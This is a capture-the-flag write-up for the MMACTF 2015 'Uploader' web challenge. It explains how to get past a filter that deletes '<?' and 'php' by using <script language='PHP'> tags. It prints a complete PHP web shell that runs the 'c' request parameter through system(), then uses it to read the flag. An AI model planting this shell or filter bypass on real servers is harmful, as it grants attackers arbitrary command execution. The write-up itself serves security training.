# Uploader (Web, 100pts)

---

## Problem

This uploader deletes all /<\?|php/. So you cannot run php.

http://recocta.chal.mmactf.link:9080/
http://recocta.chal.mmactf.link:9081/ (Mirror 1)
http://recocta.chal.mmactf.link:9082/ (Mirror 2)
http://recocta.chal.mmactf.link:9083/ (Mirror 3)

You can only upload files whose name is matched by /^[a-zA-Z0-9]+\.[a-zA-Z0-9]+$/.

## Solution

Web page contains only one simple upload form:

![Uploader task](https://github.com/bl4de/ctf/blob/master/2015/MMACTF_2015/uploader1.png)

Each file is accesible after uploading, so we can try to upload some simple shell to find the flag, which should be placed somewhere on the server.

As we can't use regular PHP script tags, so we have to find another way to upload PHP shell and execute it.
We can use _script_ tag with language set to PHP (we are using uppercases here as lower cases are deleted):
	
```html
<!-- 
file: blade.php
https://github.com/bl4de/ctf/blob/master/MMACTF_2015/blade.php
-->

<form action="" method="get"><textarea name="c" rows="10" cols="80">
	<script language="PHP"> 
		if (isset($_GET['c'])) {echo $_GET['c'];}
	</script>
</textarea><button type="submit">go</button></form><hr /><div><p>Result of <strong>
	<script language="PHP"> 
		if(isset($_GET['c'])){echo $_GET['c'];}
	</script>
</strong></p><pre>

<script language="PHP"> 
	$output="";if (isset($_GET['c'])){$output=@system($_GET['c']);};
</script>
</pre>
</div>	
```

This won't work in the future versions of PHP, as from PHP 7 ASP tags and _script_ tags will be removed.


After uploading the shell, let's take a look around:

![ls -lA executed in /](https://github.com/bl4de/ctf/blob/master/2015/MMACTF_2015/uploader2.png)

We can see file named _flag_ in the root directory of the server.

We can execute _cat flag_ command via the shell and catch the flag:

![Flag](https://github.com/bl4de/ctf/blob/master/2015/MMACTF_2015/uploader3.png)


## Links

